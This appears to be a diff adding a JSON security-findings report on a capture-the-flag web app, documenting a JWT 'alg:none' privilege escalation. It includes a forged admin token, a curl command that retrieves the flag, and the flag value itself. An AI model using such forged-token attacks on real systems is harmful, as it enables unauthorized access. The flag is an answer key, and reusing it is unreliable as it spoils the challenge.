@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T11:48:00.112250+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "5d75a61a-1b58-4fa8-92ca-87439aa5d37a",
+      "timestamp": "2026-04-13T11:48:00.112121+00:00",
+      "title": "JWT Algorithm None Attack - Privilege Escalation to Admin",
+      "severity": "critical",
+      "target": "http://172.17.0.1:39423",
+      "description": "The application issues JWT tokens with alg:none (no signature), meaning any JWT payload can be forged without a secret key. By changing the role field from 'user' to 'admin' in the JWT payload and leaving the signature empty, an attacker can escalate privileges to admin and access the /gettheflag endpoint which returns the CTF flag.",
+      "evidence": "1. Login as user:user \u2192 receives JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.\n   Header: {\"alg\":\"none\",\"typ\":\"JWT\"}\n   Payload: {\"username\":\"user\",\"role\":\"user\"}\n\n2. Forged admin JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.\n   Payload: {\"username\":\"user\",\"role\":\"admin\"}\n\n3. GET /profile with forged token \u2192 <h1>ADMIN</h1><a style=\"display:none\" href=\"/gettheflag\">Get the Flag</a>\n\n4. GET /gettheflag with forged token \u2192 FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}\n\nCTF FLAG: FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}",
+      "tool_used": "manual/curl",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "ADMIN_JWT='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.' && curl -s http://172.17.0.1:39423/gettheflag -H \"Cookie: token=$ADMIN_JWT\"",
+        "expected": "FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "9dd43993-4fc0-469f-9181-3f1865d83705",
+      "timestamp": "2026-04-13T11:48:13.524166+00:00",
+      "title": "JWT CTF Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Login[\"/login POST - user:user\"]\n  Login --> JWT[\"JWT Token Set-Cookie\\nalg:none - No Signature\"]\n  JWT --> Profile[\"/profile GET\"]\n  Profile --> |\"role=user\"| UserView[\"USER view\"]\n  Profile --> |\"role=admin (forged)\"| AdminView[\"ADMIN view + hidden /gettheflag link\"]\n  AdminView --> GetFlag[\"/gettheflag GET\"]\n  GetFlag --> Flag[\"FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}\"]"
+    }
+  ]
+}
